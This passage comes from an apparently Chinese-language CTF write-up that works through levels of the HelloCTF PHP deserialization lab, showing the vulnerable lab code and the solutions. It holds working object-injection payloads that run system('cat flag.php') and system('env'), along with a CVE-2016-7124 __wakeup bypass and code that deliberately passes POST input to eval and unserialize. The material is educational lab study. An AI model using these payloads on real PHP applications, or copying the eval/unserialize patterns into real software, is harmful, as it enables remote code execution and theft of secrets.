class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag_command</span> = <span class="string">&quot;echo &#x27;Hello CTF!&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">backdoor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;flag_command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$unserialize_string</span> = <span class="string">&#x27;O:4:&quot;FLAG&quot;:1:&#123;s:12:&quot;flag_command&quot;;s:24:&quot;echo &#x27;</span>Hello World!&lt;br&gt;<span class="string">&#x27;;&quot;;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Instantiate_object</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>(); <span class="comment">// 实例化的对象</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$Unserialize_object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$unserialize_string</span>); <span class="comment">// 反序列化的对象</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$Instantiate_object</span>-&gt;<span class="title function_ invoke__">backdoor</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$Unserialize_object</span>-&gt;<span class="title function_ invoke__">backdoor</span>();</span><br><span class="line"><span class="string">&#x27;$Instantiate_object-&gt;backdoor()&#x27;</span> will output:Hello CTF!</span><br><span class="line"><span class="string">&#x27;$Unserialize_object-&gt;backdoor()&#x27;</span> will output:Hello World!</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/* Now Your Turn */</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>])-&gt;<span class="title function_ invoke__">backdoor</span>();</span><br></pre></td></tr></table></figure><p>简单的序列化执行命令，将<code>$flag_command</code>的值修改为<code>&quot;system(&#39;cat flag.php&#39;);&quot;</code>序列化传入后即可读取flag，构造playload</p><p><code>o=O:4:&quot;FLAG&quot;:1:{s:12:&quot;flag_command&quot;;s:23:&quot;system(&#39;cat flag.php&#39;);&quot;;}</code></p><br /><h3 id="（特性）Level-8-构造函数和析构函数以及GC机制"><a href="#（特性）Level-8-构造函数和析构函数以及GC机制" class="headerlink" title="（特性）Level 8: 构造函数和析构函数以及GC机制"></a>（特性）Level 8: 构造函数和析构函数以及GC机制</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 8 : 构造函数和析构函数 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINT：注意顺序和次数</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$destruct_flag</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$construct_flag</span>;</span><br><span class="line"><span class="variable">$destruct_flag</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$construct_flag</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$class_name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;class_name = <span class="variable">$class_name</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$construct_flag</span>;</span><br><span class="line">        <span class="variable">$construct_flag</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Constructor called &quot;</span> . <span class="variable">$construct_flag</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$destruct_flag</span>;</span><br><span class="line">        <span class="variable">$destruct_flag</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Destructor called &quot;</span> . <span class="variable">$destruct_flag</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Object created*/</span></span><br><span class="line"><span class="variable">$demo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>(<span class="string">&#x27;demo&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">/*Object serialized*/</span></span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$demo</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Object unserialized*/</span></span><br><span class="line"><span class="variable">$n</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">/*unserialized object destroyed*/</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$n</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*original object destroyed*/</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$demo</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*注意 此处为了方便演示为手动释放，一般情况下，当脚本运行完毕后，php会将未显式销毁的对象自动销毁，该行为也会调用析构函数*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*此外 还有比较特殊的情况: PHP的GC(垃圾回收机制)会在脚本运行时自动管理内存，销毁不被引用的对象:*/</span></span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line">Object created:Constructor called <span class="number">1</span></span><br><span class="line">Object serialized: But Nothing <span class="title function_ invoke__">Happen</span>(:</span><br><span class="line">Object <span class="attr">unserialized</span>:But nothing happened either):</span><br><span class="line">serialized Object destroyed:Destructor called <span class="number">1</span></span><br><span class="line">original Object destroyed:Destructor called <span class="number">2</span></span><br><span class="line"></span><br><span class="line">This <span class="keyword">object</span> (<span class="string">&#x27;new FLAG();&#x27;</span>) will be destroyed immediately because it is not assigned to any variable:Constructor called <span class="number">2</span></span><br><span class="line">Destructor called <span class="number">3</span></span><br><span class="line"></span><br><span class="line">Now Your Turn!, Try to get the flag!</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RELFLAG</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$flag</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Constructor called &quot;</span> . <span class="variable">$flag</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$flag</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Destructor called &quot;</span> . <span class="variable">$flag</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flag</span> &gt; <span class="number">5</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;HelloCTF&#123;???&#125;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Check Detected flag is &quot;</span>. <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">check</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路很多，一一列举</p><h5 id="1-利用嵌套序列化-反序列化，符合出题人意图，playload"><a href="#1-利用嵌套序列化-反序列化，符合出题人意图，playload" class="headerlink" title="1.利用嵌套序列化&#x2F;反序列化，符合出题人意图，playload"></a>1.利用嵌套序列化&#x2F;反序列化，符合出题人意图，playload</h5><p><code>code=unserialize(serialize(unserialize(serialize(unserialize(serialize(unserialize(serialize(new RELFLAG()))))))));</code></p><p><code>serialize()</code>、<code>unserialize()</code>这里重复调用产生了多个对象，但是并没有调用<code>__construct()</code>和<code>__destruct()</code>方法，使<code>$flag</code>数值增加的原因是GC机制</p><h5 id="2-直接调用-destruct-方法，playload"><a href="#2-直接调用-destruct-方法，playload" class="headerlink" title="2.直接调用__destruct()方法，playload"></a>2.直接调用<code>__destruct()</code>方法，playload</h5><p><code>code=$a=new RELFLAG;$a-&gt;__destruct();$a-&gt;__destruct();$a-&gt;__destruct();$a-&gt;__destruct();$a-&gt;__destruct();</code></p><h5 id="3-直接给-flag复制为6，playload"><a href="#3-直接给-flag复制为6，playload" class="headerlink" title="3.直接给$flag复制为6，playload"></a>3.直接给<code>$flag</code>复制为6，playload</h5><p><code>code=$flag=6;</code></p><br /><h3 id="Level-9-构造函数的后门"><a href="#Level-9-构造函数的后门" class="headerlink" title="Level 9: 构造函数的后门"></a>Level 9: 构造函数的后门</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 9 : 构造函数的后门 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINT：似曾相识</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$flag_command</span> = <span class="string">&quot;echo &#x27;HelloCTF&#x27;;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span> (<span class="variable language_">$this</span>-&gt;flag_command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><code>__destruct()</code>会自动调用，修改命令即可，windows搭建的靶场拿不到flag，这里用同源的在线靶场</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$flag_command</span> = <span class="string">&quot;system(&#x27;env&#x27;);&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span> (<span class="variable language_">$this</span>-&gt;flag_command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>());</span><br></pre></td></tr></table></figure><p>输出playload：<code>o=O:4:&quot;FLAG&quot;:1:{s:12:&quot;flag_command&quot;;s:14:&quot;system(&#39;env&#39;);&quot;;}</code></p><br /><h3 id="Level-10-wakeup"><a href="#Level-10-wakeup" class="headerlink" title="Level 10: __wakeup()"></a>Level 10: __wakeup()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 10 : weakup! --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</span></span><br><span class="line"><span class="comment">除开构造和析构函数，这应该是你第一个真正意义上开始接触的魔术方法，此后每一个魔术方法对应的题目我都会在这里介绍。</span></span><br><span class="line"><span class="comment">当然你也可以直接查阅PHP官网文档 - 魔术方法部分：https://www.php.net/manual/zh/language.oop5.magic.php</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>());</span><br></pre></td></tr></table></figure><p>随便实例化一个对象序列化传上去就行<code>o=O:4:&quot;FLAG&quot;:0:{}</code></p><br /><h3 id="（特性）Level-11-wakeup-CVE-2016-7124"><a href="#（特性）Level-11-wakeup-CVE-2016-7124" class="headerlink" title="（特性）Level 11: __wakeup() CVE-2016-7124"></a>（特性）Level 11: __wakeup() CVE-2016-7124</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 11 : Bypass weakup! --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CVE-2016-7124 - PHP5 &lt; 5.6.25 / PHP7 &lt; 7.0.10</span></span><br><span class="line"><span class="comment">在该漏洞中，当序列化字符串中对象属性的值大于真实属性值时便会跳过__wakeup的执行。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&quot;FAKEFLAG&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$flag</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;sorry,flag is gone!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要掠过<code>__wakeup()</code>方法的调用，结合hint，对象属性的值大于真实属性值时便会跳过wakeup的执行，先构造序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&quot;FAKEFLAG&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$flag</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;sorry,flag is gone!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$flag</span>);</span><br></pre></td></tr></table></figure><p>得出的序列化字符串：<code>O:4:&quot;FLAG&quot;:1:{s:4:&quot;flag&quot;;s:8:&quot;FAKEFLAG&quot;;}</code></p><p>修改属性数值得到新字符串<code>O:4:&quot;FLAG&quot;:2:{s:4:&quot;flag&quot;;s:8:&quot;FAKEFLAG&quot;;}</code>传递即可</p><br /><h3 id="Level-12-sleep"><a href="#Level-12-sleep" class="headerlink" title="Level 12: __sleep()"></a>Level 12: __sleep()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 12 : sleep! --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">年轻就是好啊，倒头就睡。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。</span></span><br><span class="line"><span class="comment">该方法必须返回一个数组: return array(&#x27;属性1&#x27;, &#x27;属性2&#x27;, &#x27;属性3&#x27;) / return [&#x27;属性1&#x27;, &#x27;属性2&#x27;, &#x27;属性3&#x27;]。</span></span><br><span class="line"><span class="comment">数组中的属性名将决定哪些变量将被序列化，当属性被 static 修饰时，无论有无都无法序列化该属性。</span></span><br><span class="line"><span class="comment">如果需要返回父类中的私有属性，需要使用序列化中的特殊格式 - %00父类名称%00变量名 (%00 是 ASCII 值为 0 的空字符 null,在代码内我们也可以通过 &quot;\0&quot; - 注意在双引号中，PHP 才会解析转义字符和变量。)。</span></span><br><span class="line"><span class="comment">例如，父类 FLAG 的私有属性 private $f; 应该在子类的 __sleep() 方法中以 &quot;\0FLAG\0f&quot; 的格式返回。</span></span><br><span class="line"><span class="comment">如果该方法未返回任何内容，序列化会被制空，并产生一个 E_NOTICE 级别的错误。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$l</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$g</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>,<span class="variable">$y</span>,<span class="variable">$z</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CHALLENGE</span> <span class="keyword">extends</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h</span>,<span class="variable">$e</span>,<span class="variable">$l</span>,<span class="variable">$I</span>,<span class="variable">$o</span>,<span class="variable">$c</span>,<span class="variable">$t</span>,<span class="variable">$f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">chance</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_GET</span>[<span class="string">&#x27;chance&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">/* FLAG is $h + $e + $l + $I + $o + $c + $t + $f + $f + $l + $a + $g */</span></span><br><span class="line">        <span class="variable">$array_list</span> = [<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;g&#x27;</span>];</span><br><span class="line">        <span class="variable">$_</span>=<span class="title function_ invoke__">array_rand</span>(<span class="variable">$array_list</span>);<span class="variable">$__</span>=<span class="title function_ invoke__">array_rand</span>(<span class="variable">$array_list</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="variable">$array_list</span>[<span class="variable">$_</span>],<span class="variable">$array_list</span>[<span class="variable">$__</span>],<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">chance</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$FLAG</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$FLAG</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">CHALLENGE</span>());</span><br></pre></td></tr></table></figure><p><code>array_rand($array_list)</code>函数：从<code>$array_list</code>中随机抽取一个元素</p><p>结合hint，利用chance依次传递参数<code>&#39;h&#39;,&#39;e&#39;,&#39;l&#39;,&#39;I&#39;,&#39;o&#39;,&#39;c&#39;,&#39;t&#39;,&#39;f&#39;,&#39;%00FLAG%00f&#39;,&#39;%00FLAG%00l&#39;,&#39;a&#39;,&#39;g&#39;</code>组合拼接得到flag，由于后面的两个<code>&#39;f&#39;,&#39;l&#39;</code>是父类里面的私有属性，需要返回需要使用序列化中的特殊格式 ，就比如<code>%00FLAG%00f</code></p><br 